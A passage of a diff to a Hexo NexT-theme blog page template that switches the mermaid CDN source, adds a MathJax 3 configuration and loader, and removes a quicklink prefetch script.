-window.addEventListener('pjax:success', () => {
+document.addEventListener('pjax:success', () => {
   document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
     var code = element.text || element.textContent || element.innerHTML || '';
     var parent = element.parentNode;
@@ -837,7 +825,7 @@ document.querySelectorAll('.pdfobject-container').forEach(element => {
 
 <script data-pjax>
 if (document.querySelectorAll('pre.mermaid').length) {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+  NexT.utils.getScript('//cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.8/mermaid.min.js', () => {
     mermaid.initialize({
       theme    : 'default',
       logLevel : 3,
@@ -854,18 +842,61 @@ if (document.querySelectorAll('pre.mermaid').length) {
   
 
   
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
-  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
-  <script>
-      window.addEventListener('load', () => {
-      quicklink({
-        timeout : 3000,
-        priority: true,
-        ignores : [uri => uri.includes('#'),uri => uri === 'http://dog.wtf/tech/heap-overflow-learning-notes-2/',]
-      });
-      });
-  </script>
 
 <script>
   function loadCount() {
